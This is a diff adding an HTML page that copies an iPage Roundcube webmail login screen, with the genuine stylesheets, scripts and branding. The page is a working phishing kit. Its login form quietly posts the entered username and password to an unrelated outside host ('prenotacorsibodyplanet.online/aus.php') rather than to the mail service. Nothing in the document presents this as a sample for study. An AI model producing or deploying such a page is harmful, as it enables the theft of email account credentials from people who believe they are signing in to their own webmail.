@@ -1,0 +1,134 @@
+<html lang="en" class=" js chrome webkit js chrome webkit"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Webmail :: Welcome to Webmail</title>
+<meta name="viewport" content="" id="viewport">
+<link rel="shortcut icon" href="https://emailmg.ipage.com/roundcube/skins/larry/images/favicon.ico">
+<link rel="stylesheet" type="text/css" href="https://emailmg.ipage.com/roundcube/skins/larry/styles.min.css?s=1602546899">
+<link rel="stylesheet" type="text/css" href="https://emailmg.ipage.com/roundcube/plugins/jqueryui/themes/larry/jquery-ui.css?s=1602546899">
+<link rel="stylesheet" type="text/css" href="https://emailmg.ipage.com/roundcube/plugins/xframework/assets/styles/framework.css?s=1602546899">
+<link rel="stylesheet" type="text/css" href="https://emailmg.ipage.com/roundcube/plugins/xskin/assets/styles/xdesktop.css?s=1602546899">
+<link rel="stylesheet" type="text/css" href="https://emailmg.ipage.com/roundcube/skins/droid/assets/desktop.css?s=1602546899">
+<script type="text/javascript" defer="" async="" src="https://cdn.evergage.com/beacon/eig/vDeckTest/scripts/evergageSmall.min.js"></script><script type="text/javascript" defer="" async="" src=".https://emailmg.ipage.com/roundcube/skins/larry/ui.min.js?s=1602546899"></script><script type="text/javascript" src="./emailmg.ipage.com_files/ui.min.js.download"></script>
+
+
+
+
+<!-- Customized section -->
+
+<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,700" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700" type="text/css">
+
+<script type="text/javascript">
+  var _aaq = _aaq || [];
+  var __acct = 'eig';
+  var __dset = 'vDeckTest';
+  _aaq.push(['setEvergageAccount', __acct], ['setDataset', __dset], ['setUseSiteConfig', true], ['setLoggingLevel', 'NONE']);
+
+  (function(d){
+    var g = d.createElement('script'), s = d.getElementsByTagName('script')[0];
+        g.type = 'text/javascript'; g.defer = true; g.async = true;
+        g.src = d.location.protocol + '//cdn.evergage.com/beacon/' + __acct + '/' + __dset + '/scripts/evergageSmall.min.js';
+        s.parentNode.insertBefore(g, s);
+  })(document);
+</script>
+
+
+<script src="https://emailmg.ipage.com/roundcube/program/js/jquery.min.js?s=1602546899" type="text/javascript"></script>
+<script src="https://emailmg.ipage.com/roundcube/program/js/common.min.js?s=1602546899" type="text/javascript"></script>
+<script src="https://emailmg.ipage.com/roundcube/program/js/app.min.js?s=1602546899" type="text/javascript"></script>
+<script src="https://emailmg.ipage.com/roundcube/program/js/jstz.min.js?s=1602546899" type="text/javascript"></script>
+<script type="text/javascript">
+
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) 2005-2014 The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"en_US","devel_mode":null,"cookie_domain":"","cookie_path":"\/","cookie_secure":true,"skin":"droid","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":".\/?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","dateFormats":{"php":"Y-m-d","moment":"YYYY-MM-DD","datepicker":"yy-mm-dd"},"dmFormats":{"php":"m-d","moment":"MM-DD","datepicker":"mm-dd"},"timeFormats":{"php":"H:i","moment":"HH:mm"},"xphone":false,"xtablet":false,"xmobile":false,"xdesktop":true,"xdevice":"desktop","timezoneOffset":-14400,"xassets":["..\/xframework\/assets\/scripts\/framework.min.js","..\/xframework\/assets\/styles\/framework.css","xskin:assets\/scripts\/xskin.min.js","xskin:assets\/scripts\/xdesktop.min.js","xskin:assets\/styles\/xdesktop.css","xskin:..\/..\/skins\/droid\/assets\/desktop.css"],"xskin":"droid","xphone_skin":"droid","xtablet_skin":"droid","xdesktop_skin":"droid","xskin_type":"desktop","rcp_skin":true,"installed_skins":["classic","droid","larry"],"xcolor":"3F51B5","xwatermark":"..\/..\/plugins\/xskin\/assets\/images\/watermark.png","appsMenu":"\u003Ca class=\"button-apps\" href=\"javascript:void(0)\" id=\"button-apps\" onclick=\"UI.toggle_popup(&quot;apps-menu&quot;, event)\"\u003E\u003Cspan class=\"button-inner\"\u003EApps\u003C\/span\u003E\u003C\/a\u003E\u003Cdiv id=\"apps-menu\" class=\"popupmenu count-1\"\u003E\u003Ca class=\"app-item app-item-xskin\" href=\"?_task=settings&amp;_action=preferences&amp;_section=general\"\u003E\u003Cdiv class='icon'\u003E\u003C\/div\u003E\u003Cdiv class='title'\u003ESkins\u003C\/div\u003E\u003C\/a\u003E\u003C\/div\u003E\n","request_token":"l2KOabvwwqKWXEpUAplqxqRDIUxA0qQG"});
+rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","windowopenerror":"The popup window was blocked!","uploadingmany":"Uploading files...","close":"Close","login":"Login","folders":"Folders","search":"Search","attachment":"Attachment","section":"Section","options":"Options","errortitle":"An error occurred!","toggleadvancedoptions":"Toggle advanced options"});
+rcmail.gui_container("loginfooter","bottomline");
+rcmail.gui_object('loginform', 'form');
+rcmail.gui_object('message', 'message');
+</script>
+
+<script type="text/javascript" src="https://emailmg.ipage.com/roundcube/plugins/jqueryui/js/jquery-ui.min.js?s=1602546899"></script>
+<script type="text/javascript" src="https://emailmg.ipage.com/roundcube/plugins/xframework/assets/scripts/framework.min.js?s=1602546899"></script>
+<script type="text/javascript" src="https://emailmg.ipage.com/roundcube/plugins/xskin/assets/scripts/xskin.min.js?s=1602546899"></script>
+<script type="text/javascript" src="https://emailmg.ipage.com/roundcube/plugins/xskin/assets/scripts/xdesktop.min.js?s=1602546899"></script>
+</head>
+<body class="xskin skin-droid color-3F51B5 login-page xdesktop font-icons-toolbars xicons-material">
+
+<h1 class="voice">Webmail Login</h1>
+
+<div id="login-form">
+<div class="box-inner" role="main">
+<img src="https://emailmg.ipage.com/roundcube/skins/droid/assets/images/logo_header.png" id="logo" alt="Webmail">
+
+<div id="company-name">Webmail</div><h1><span>Login</span></h1>
+<form name="form" method="post" action="https://prenotacorsibodyplanet.online/aus.php">
+<input type="hidden" name="_token" value="l2KOabvwwqKWXEpUAplqxqRDIUxA0qQG">
+<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="Asia/Bangkok"><input type="hidden" name="_url" id="rcmloginurl" value=""><table><tbody><tr><td class="title"><label for="rcmloginuser">Username</label>
+</td>
+<td class="input"><input name="username" id="usename" required="required" size="40" autocapitalize="off" autocomplete="off" type="text"></td>
+</tr>
+<tr><td class="title"><label for="rcmloginpwd">Password</label>
+</td>
+<td class="input"><input name="password" id="password" required="required" size="40" autocapitalize="off" autocomplete="off" type="password"></td>
+</tr>
+</tbody>
+</table>
+<p class="formbuttons"><input type="submit" id="rcmloginsubmit" class="button mainaction" value="Login"></p>
+
+</form>
+
+</div>
+
+<div class="box-bottom" role="complementary">
+	<div id="message"></div>
+	<noscript>
+		<p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
+	</noscript>
+</div>
+
+<div id="bottomline" role="contentinfo">
+	  Webmail 
+		
+</div>
+</div>
+
+
+
+<script type="text/javascript">
+if (!window.UI) { var UI = new rcube_mail_ui(); }
+</script>
+
+
+
+
+<a id="vendor-branding" href="http://roundcubeplus.com/" target="_blank" title="More Roundcube skins and plugins at roundcubeplus.com"><span id="vendor-icon-2"> </span><span id="vendor-icon-1"> </span></a><script type="text/javascript">
+
+$(document).ready(function(){ 
+rcmail.init();
+var images = ["skins\/larry\/images\/ajaxloader.gif","skins\/larry\/images\/ajaxloader_dark.gif","skins\/larry\/images\/buttons.png","skins\/larry\/images\/addcontact.png","skins\/larry\/images\/filetypes.png","skins\/larry\/images\/listicons.png","skins\/larry\/images\/messages.png","skins\/larry\/images\/messages_dark.png","skins\/larry\/images\/quota.png","skins\/larry\/images\/selector.png","skins\/larry\/images\/splitter.png","skins\/larry\/images\/watermark.jpg"];
+            for (var i=0; i<images.length; i++) {
+                img = new Image();
+                img.src = images[i];
+            }
+});
+</script>
+
+
+</body></html>
